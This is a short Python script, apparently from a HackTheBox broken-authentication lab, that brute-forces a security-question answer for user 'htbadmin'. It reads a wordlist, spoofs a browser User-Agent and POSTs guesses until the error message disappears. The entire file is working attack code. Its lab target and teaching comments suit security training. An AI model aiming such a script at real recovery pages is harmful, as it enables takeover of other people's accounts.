import sys
import requests
import os.path

# target url, change as needed
url = "http://brokenauthentication.hackthebox.eu/predictable_questions.php"

# fake headers to present ourself as Chromium browser, change if needed
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"}

# string expected if the answer is wrong
invalid = "Sorry, wrong answer"

# question to bruteforce
question = "Do you prefer pizza or pasta?"


# wordlist is expected as one word per line, function kept to let you to parse different wordlist format keeping the code clean
def unpack(fline):
    answer = fline

    return answer

# do the web request, change data as needed
def do_req(url, answer, headers):
    # closely inspect POST data sent using any intercepting proxy to create a valid data
    data = {"answer": answer, "question": question, "userid": "htbadmin", "submit": "answer"}
    res = requests.post(url, headers=headers, data=data)

    return res.text

# pretending we just know the message received when the answer is wrong, we flip the check
def check(haystack, needle):
    # if our invalid string is found in response body return False
    if needle in haystack:
        return False
    else:
        return True

def main():
    # check if wordlist has been given and exists
    if (len(sys.argv) > 1) and (os.path.isfile(sys.argv[1])):
        fname = sys.argv[1]
    else:
        print("[!] Please check wordlist.")
        print("[-] Usage: python3 {} /path/to/wordlist".format(sys.argv[0]))
        sys.exit()

    # open the file
    with open(fname) as fh:
        for fline in fh:
            # skip line if starts with a comment
            if fline.startswith("#"):
                continue
            # extract userid and password from wordlist, removing trailing newline
            answer = unpack(fline.rstrip())

            # do HTTP request
            print("[-] Checking word {}".format(answer))
            res = do_req(url, answer, headers)

            # check if response text matches our content
            #print(res)
            if (check(res, invalid)):
                print("[+] Valid answer found: {}".format(answer))
                sys.exit()

if __name__ == "__main__":
    main()
